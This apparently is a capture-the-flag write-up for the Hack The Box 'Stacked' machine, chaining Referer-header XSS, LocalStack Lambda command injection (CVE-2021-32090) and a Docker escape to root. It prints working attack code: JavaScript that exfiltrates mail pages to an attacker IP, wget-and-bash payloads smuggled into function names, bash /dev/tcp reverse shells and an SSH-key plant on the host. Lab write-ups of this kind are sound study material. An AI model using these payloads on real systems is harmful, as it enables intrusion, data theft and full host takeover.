### Don't reply on rustscan
```bash
❯ nmap -p2376 $IP -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 12:36 NZDT
Nmap scan report for 10.129.228.28
Host is up (0.17s latency).

PORT     STATE SERVICE     VERSION
2376/tcp open  ssl/docker?
| ssl-cert: Subject: commonName=stacked
| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1
| Not valid before: 2022-08-17T15:41:56
|_Not valid after:  2025-05-12T15:41:56
```

Nmap scan shows OpenSSH and Apache listening on their default ports, and a service that is potentially recognised as ssl/docker on port 2376.

### Subdomains
```bash
❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://$IP -H 'Host: FUZZ.stacked.htb' -fc 302

portfolio               [Status: 200, Size: 30268, Words: 11467, Lines: 445, Duration: 144ms]
```

### XSS in Referer header
It took about 1 min, then add mail to the host
```bash
❯ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.228.28] 60862
GET / HTTP/1.1
Host: 10.10.16.4:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mail.stacked.htb/read-mail.php?id=2
Connection: keep-alive
```

Within a minute we get a request on our listener, meaning our payload was successfully stored on a page that someone visited from the mail.stacked.htb subdomain. The referer domain looks like some sort of email system, which could contain sensitive information. We can use JavaScript to force the client to retrieve the mail page and exfiltrate the output, starting with `id=1` (assuming the id parameter could represent either a mailbox or a message). We create the following script.js file:
```js
var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
	if(this.readyState == 4 && fetch_req.readyState == XMLHttpRequest.DONE) {
		var exfil_req = new XMLHttpRequest();
		exfil_req.open("POST", "http://10.10.14.43:3000", false);
		exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
	}
};
fetch_req.open("GET", "http://mail.stacked.htb/read-mail.php?id=1", false);
fetch_req.send();
```

```bash
❯ nc -lvnp 3000
listening on [any] 3000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.228.28] 40874
POST / HTTP/1.1
Host: 10.10.16.4:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mail.stacked.htb/read-mail.php?id=3
Content-Length: 10956
Content-Type: text/plain;charset=UTF-8
Origin: http://mail.stacked.htb
Connection: keep-alive

Resp Code: 200
Page Source:
```

will be empty without id.

```js
var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
	if(this.readyState == 4 && fetch_req.readyState == XMLHttpRequest.DONE) {
		var exfil_req = new XMLHttpRequest();
		exfil_req.open("POST", "http://10.10.14.43:3000", false);
		exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
	}
};
fetch_req.open("GET", "http://mail.stacked.htb/read-mail.php?alvin=007", false);
fetch_req.send();
```

### CVE-2021-32090
```bash
❯ curl s3-testing.stacked.htb
{"status": "running"}
```

Get from `docker-compose.yml` which is the LocalStack dashboard port mapped to - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}".

And we assumption, which will be verified later, is that the web browser that is executing our XSS payloads is running on the same machine as the LocalStack instance, and thus will be able to access the web UI.

##### Create lambda function
HTB academy ${IFS} 	Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())
```bash
aws lambda --endpoint=http://s3-testing.stacked.htb create-function \
    --region ap-northeast-1 \
    --function-name "api;wget\${IFS}10.10.16.4/runme.sh;bash\${IFS}runme.sh" \
    --runtime nodejs8.10 \
    --handler lambda.apiHandler \
    --memory-size 128 \
    --zip-file fileb://api-handler.zip \
    --role arn:aws:iam::123456:role/irrelevant
    ```

{
    "FunctionName": "api;wget${IFS}10.10.16.4/runme.sh;bash${IFS}runme.sh",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:api;wget${IFS}10.10.16.4/runme.sh;bash${IFS}runme.sh",
    "Runtime": "nodejs8.10",
    "Role": "arn:aws:iam::123456:role/irrelevant",
    "Handler": "lambda.apiHandler",
    "CodeSize": 405,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2023-01-20T02:23:57.683+0000",
    "CodeSha256": "45uc4WaxW/jqP0pJdevclnLFwN8UFJACEIbmkpTzsUE=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "65dae072-1c64-40a7-b870-8fd4f3272a67",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
(END)

Finally, we make a request to the XSS-vulnerable endpoint setting the Referrer header to `<script>document.location="http://127.0.0.1:8080"</script>`.

Redo things if the shell doesn't drop at the first try.

##### Alternatively command injection in `/lambda/<functionName>/code` to get the reverse shell
```bash
echo -n 'bash  -i >& /dev/tcp/10.10.16.4/8899 0>&1' | base64  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC84ODk5IDA+JjE=
```

Then XSS to triger the exploit.js. It more like the inline version of the other way.

### Enum for root
##### Looking shared volume mount with the host
```bash
/opt/code/localstack $ df -h
Filesystem                Size      Used Available Use% Mounted on
overlay                   7.3G      6.5G    760.3M  90% /
tmpfs                    64.0M         0     64.0M   0% /dev
tmpfs                     1.9G         0      1.9G   0% /sys/fs/cgroup
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    760.3M  90% /tmp/localstack
df: /root/.docker: Permission denied
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    760.3M  90% /etc/resolv.conf
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    760.3M  90% /etc/hostname
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    760.3M  90% /etc/hosts
shm                      64.0M      8.0K     64.0M   0% /dev/shm
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    760.3M  90% /home/localstack/user.txt
tmpfs                     1.9G         0      1.9G   0% /proc/acpi
tmpfs                    64.0M         0     64.0M   0% /proc/kcore
tmpfs                    64.0M         0     64.0M   0% /proc/keys
tmpfs                    64.0M         0     64.0M   0% /proc/timer_list
tmpfs                    64.0M         0     64.0M   0% /proc/sched_debug
tmpfs                     1.9G         0      1.9G   0% /proc/scsi
tmpfs                     1.9G         0      1.9G   0% /sys/firmware
```

##### Privilege escalation in the container
Let’s enumerate running processes executed by root:
```bash
/opt/code/localstack $ ps -a | grep root
    1 root      0:00 {docker-entrypoi} /bin/bash /usr/local/bin/docker-entrypoint.sh
   14 root      0:03 {supervisord} /usr/bin/python3.8 /usr/bin/supervisord -c /etc/supervisord.conf
   16 root      0:01 tail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err
   21 root      0:00 make infra
   23 root      0:26 python bin/localstack start --host
   91 root      0:27 java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -port 46079 -dbPath /var/localstack/data/dynamodb
  106 root      0:00 node /opt/code/localstack/localstack/node_modules/kinesalite/cli.js --shardLimit 100 --port 35293 --createStreamMs 500 --deleteStreamMs 500 --updateStreamMs 500 --path /var/localstack/data/kinesis
  516 localsta  0:00 grep root
  ```

### Root on localstack (Privilege escalation in the container)
##### pspy when calling the lambda function
We can see that the string `lambda.apiHandler`, which is the same as the --handler parameter we set, is passed to the command. This turns out to be injectable as user input is not sanitized, allowing us to execute arbitrary OS commands.

```bash
aws lambda --endpoint=http://s3-testing.stacked.htb create-function \
    --region ap-northeast-1 \
    --function-name "injectinghandler01" \
    --runtime nodejs8.10 \
    --handler 'lambda.apiHandler $(/bin/bash -c "bash -i >& /dev/tcp/10.10.16.4/9999 0>&1")' \
    --memory-size 128 \
    --zip-file fileb://api-handler.zip \
    --role arn:aws:iam::123456:role/irrelevant

aws lambda --endpoint=http://s3-testing.stacked.htb invoke \
	--region ap-northeast-1 \
	--function-name "injectinghandler01" out
    ```

```bash
❯ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.228.28] 33078
bash: cannot set terminal process group (557): Not a tty
bash: no job control in this shell
bash-5.0# whoami
whoami
root
```

##### Alternative way
* https://7rocky.github.io/en/htb/stacked/#privilege-escalation-in-the-container

### Root on Stacked (Privilege escalation in the machine)
We now have unrestricted access to the Docker API, which we can abuse by creating a new container mounting the host filesystem. We will use an existing image and override its entrypoint with `/bin/sh`.

```bash
~ # docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
localstack/localstack-full   0.12.6              7085b5de9f7c        18 months ago       888MB
localstack/localstack-full   <none>              0601ea177088        23 months ago       882MB
lambci/lambda                nodejs12.x          22a4ada8399c        24 months ago       390MB
lambci/lambda                nodejs10.x          db93be728e7b        24 months ago       385MB
lambci/lambda                nodejs8.10          5754fee26e6e        24 months ago       813MB

docker run -v /:/mnt --entrypoint sh -it 0601ea177088

/mnt/root/.ssh # echo "ssh-xxx<SNIP>" >> authorized_keys
```

If creating a new container from scratch: https://7rocky.github.io/en/htb/stacked/#privilege-escalation-on-the-machine

### Beyond root
* https://0xdf.gitlab.io/2022/03/19/htb-stacked.html#beyond-root

### Refernece
* https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/
* https://portswigger.net/daily-swig/localstack-zero-day-vulnerabilities-chained-to-achieve-remote-takeover-of-local-instances
* https://www.sonarsource.com/blog/hack-the-stack-with-localstack/
* https://stackoverflow.com/questions/632774/what-do-the-different-readystates-in-xmlhttprequest-mean-and-how-can-i-use-them
* https://gist.github.com/A1vinSmith/4ec1553fe85e3fd0ed814199f6a7e1b0

### Writeups
* https://7rocky.github.io/en/htb/stacked/
